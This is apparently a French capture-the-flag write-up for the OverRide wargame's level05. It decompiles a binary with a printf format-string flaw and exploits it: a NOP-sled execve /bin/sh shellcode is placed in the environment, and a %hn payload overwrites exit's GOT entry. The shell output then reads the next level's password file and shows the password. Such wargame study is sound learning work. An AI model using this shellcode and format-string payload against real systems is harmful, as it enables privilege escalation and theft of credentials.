# **Level 05**

Pour ce `level05` nous decompilons l'executable

```
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	char s[100]; // [esp+28h] [ebp-70h] BYREF
	unsigned int i; // [esp+8Ch] [ebp-Ch]

	i = 0;
	fgets(s, 100, stdin);
	for ( i = 0; i < strlen(s); ++i ) //tolower
	{
		if ( s[i] > 64 && s[i] <= 90 )
			s[i] ^= 0x20u;
	}
	printf(s);
	exit(0);
}
```

Donc le code prend un input de `100` caractere, effectue un `tolower` dessus, puis l'affiche en utilisant `printf`

Cependant `printf` est ici mal utilise, le premier arguments de `printf` correspond a la format string donc
les `%_` sont interprete, on peux donc faire une `format string attack` sur cette executable

On va donc mettre un `shellcode` dans l'env precede par une multitude de `NOP` puis remplacer l'addresse de `exit`
par l'addresse de notre `shellcode` grace au `%n`

Nous commencons par recuperer l'addresse d'`exit`

```
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0 <==
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
```
Adresse exit -> `0x80497e0`

Puis nous creeons notre `shellcode` dans l'env
```
level05@OverRide:~$ export SHELLCODE=$(python -c "print'\x90'*1024 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'")
```

Et nous recuperons sont addresse
```
(gdb) x getenv("SHELLCODE")
0xffffd4ba:	0x90909090
```

Et la nous avons un probleme, car `0xffffd4b0` est superieur a `2147483647 (MAXINT)` aui est la valeur maximal que prend `%n`
donc nous ne pouvons pas ecrire cette addresse de cette facon

Il faut donc ruser, un `int` est compose de `4` bytes ce aui signifie que pour avancer d'`int` en `int` il faut avancer de `4` bytes.
Mais que ce passe-t-il quand on avance uniquement de `2` bytes ?
Tout simplement on recupere les deux derniers byte de l'addresse de base et les 2 premiers byte de l'addresse suivante

Voici un schema pour expliquer

![Le schema](/level05/resources/ovveridelvl05.png)

Donc le plan est d'ecrire les `2` premiers bytes de l'addresse de notre `shellcode` dans l'addresse `exit`
puis les `2` derniers dans l'addresse d'`exit + 2`.

> On vise au milieux des `NOP` donc `0xd4ba` deviens `0xd5ba`

Soit `0xd5ba - 8` = `54714` puis `0xffff - 0xd5ba - 8 = 10813`

On peux donc faire notre payload

> On utilise `%hn` au lieu de `%n` pour marque le fais qu'on ecrit uniquement sur les 2 premiers bytes

```
level05@OverRide:~$ python -c 'print"\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%54714x%10$n%10813x%11$n"' > /var/crash/file
level05@OverRide:~$ cat /var/crash/file - | ./level05 
id
uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=1006(level06),100(users),1005(level05)
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq

```

> ### NEXT : [Level 06](/level06/resources/README.md)
